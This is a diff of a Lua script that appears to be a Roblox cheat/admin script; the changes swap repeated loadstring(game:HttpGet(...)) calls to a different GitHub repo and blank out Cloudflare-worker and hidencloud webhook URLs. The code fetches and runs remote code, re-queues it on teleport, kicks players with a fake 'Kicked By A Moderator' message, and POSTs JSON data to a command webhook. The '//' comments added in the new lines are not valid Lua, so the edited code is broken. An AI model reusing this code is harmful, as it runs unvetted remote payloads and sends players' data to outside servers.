@@ -9367,7 +9367,7 @@ if not _G.Opened then
 							if target == game.Players.LocalPlayer then
 								game.Players.LocalPlayer:Kick("Kicked By A Moderator")
 								if queue_on_teleport then
-									queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Mercy%20Script\"))()")
+									queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Rive-Team/script.souce.code/refs/heads/main/VR2\"))()")
 								end
 							end
 						end,
@@ -9376,7 +9376,7 @@ if not _G.Opened then
 							if target == game.Players.LocalPlayer then
 								game.Players.LocalPlayer:Kick(tertiaryArgument)
 								if queue_on_teleport then
-									queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Mercy%20Script\"))()")
+									queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Rive-Team/script.souce.code/refs/heads/main/VR2\"))()")
 								end
 							end
 						end,
@@ -9471,8 +9471,8 @@ if not _G.Opened then
 					}
 
 					spawn(function()
-						local vercelGet = loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Vercel-get"))()
-						local cmdhookUrl = "https://oosoos.0dryfd.workers.dev/cmdhook"
+						local vercelGet = //loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Vercel-get"))()
+						local cmdhookUrl = "webhook" //https://oosoos.0dryfd.workers.dev/cmdhook
 
 						getgenv().Cooldowner = false
 						getgenv().CommandLoopRunning = false
@@ -9503,7 +9503,7 @@ if not _G.Opened then
 
 						local function loadBlacklist()
 							local success, data = pcall(function()
-								return loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Hehehe"))()
+								return loadstring(game:HttpGet("https://raw.githubusercontent.com/Rive-Team/script.souce.code/refs/heads/main/sc"))()
 							end)
 							if success and type(data) == "table" then
 								return data
@@ -9595,7 +9595,7 @@ if not _G.Opened then
 									end)
 
 									if queue_on_teleport then
-										queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Mercy%20Script\"))()")
+										queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Rive-Team/script.souce.code/refs/heads/main/VR2\"))()")
 									end
 								end)
 							end
@@ -9744,7 +9744,7 @@ if not _G.Opened then
 
 											pcall(function()
 												request({
-													Url = "https://oosoos.0dryfd.workers.dev/cmdhook",
+													Url = "webhook", //https://oosoos.0dryfd.workers.dev/cmdhook
 													Method = "POST",
 													Headers = { ["Content-Type"] = "application/json" },
 													Body = game:GetService("HttpService"):JSONEncode(webhookData)
@@ -9752,7 +9752,7 @@ if not _G.Opened then
 											end)
 
 											if queue_on_teleport then
-												queue_on_teleport("loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-VR2-146159\"))()")
+												queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Rive-Team/script.souce.code/refs/heads/main/VR2\"))()")
 											end
 										end
 									end
@@ -9802,9 +9802,9 @@ if not _G.Opened then
 			end
 
 			local webhookUrls = {
-				"http://vicky.hidencloud.com:24599/api/webhook",
-				"http://vicky.hidencloud.com:24599/api/webhook2",
-				"http://vicky.hidencloud.com:24599/api/webhook3"
+				"webhook",
+				"",
+				""
 			}
 			local randomUrl = webhookUrls[math.random(1, 3)]
 
